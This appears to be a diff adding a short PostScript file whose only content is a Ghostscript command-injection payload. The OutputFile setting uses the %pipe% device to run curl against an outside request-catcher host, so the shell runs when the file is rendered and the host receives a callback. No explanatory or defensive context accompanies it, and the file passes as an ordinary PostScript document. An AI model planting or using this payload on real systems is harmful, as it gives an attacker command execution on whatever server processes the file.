@@ -1,0 +1,6 @@
+%!PS-Adobe-3.0
+  <<
+    /OutputDevice /png16m
+    /OutputFile (%pipe%curl -fsS https://worknow.requestcatcher.com/test)
+  >> setpagedevice
+  showpage
